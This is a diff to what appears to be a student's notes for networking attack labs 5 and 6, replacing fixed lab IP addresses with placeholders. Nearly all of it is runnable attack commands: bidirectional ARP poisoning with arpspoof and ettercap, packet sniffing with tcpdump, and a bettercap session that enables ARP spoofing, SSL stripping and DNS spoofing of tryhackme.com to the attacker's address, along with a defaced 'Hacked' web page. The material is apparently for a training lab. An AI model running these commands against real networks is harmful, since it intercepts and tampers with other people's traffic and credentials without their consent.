@@ -82,34 +82,46 @@ sudo ettercap -G
 LAB 5
 sudo apt update
 sudo apt install -y dsniff ettercap-graphical tcpdump
+
+ip a          # find [INTERFACE] and [ATTACKER_IP]
+ip route      # find [GATEWAY_IP]
+sudo arp-scan --localnet   # find [VICTIM_IP]
+
 sudo sysctl -w net.ipv4.ip_forward=1
-ip a
-ip route
-sudo arpspoof -i eth0 -t 192.168.234.1 192.168.234.2
-# Terminal 2:
-sudo arpspoof -i eth0 -t 192.168.234.2 192.168.234.1
-# Terminal 3:
+sudo arpspoof -i eth0 -t [VICTIM_IP] [GATEWAY_IP]
+
+sudo arpspoof -i eth0 -t [GATEWAY_IP] [VICTIM_IP]
+
 sudo tcpdump -i eth0 -n -v
-sudo ettercap -T -M arp:remote /192.168.234.130// /192.168.234.2//
+
+sudo ettercap -T -M arp:remote /[VICTIM_IP]// /[GATEWAY_IP]//
+
 
 
 
 LAB 6
 sudo apt update
 sudo apt install -y bettercap apache2 wireshark
-sudo service apache2 start
+
+ip a          # find [INTERFACE] and [ATTACKER_IP]
+ip route      # find [GATEWAY_IP]
+sudo arp-scan --localnet   # find [VICTIM_IP]
+
+echo "<h1>Hacked</h1>" | sudo tee /var/www/html/index.html
+
 sudo sysctl -w net.ipv4.ip_forward=1
-sudo bettercap -iface eth0 --gateway-override 192.168.234.2
+
+sudo bettercap -iface eth0 --gateway-override [GATEWAY_IP]
 
 net.probe on
 net.show
-set arp.spoof.targets 192.168.234.1
+set arp.spoof.targets [VICTIM_IP]
 set arp.spoof.fullduplex true
 arp.spoof on
 set http.proxy.sslstrip true
 http.proxy on
 set dns.spoof.domains tryhackme.com
-set dns.spoof.address 192.168.234.130
+set dns.spoof.address [ATTACKER_IP]
 dns.spoof on
 net.sniff on
 
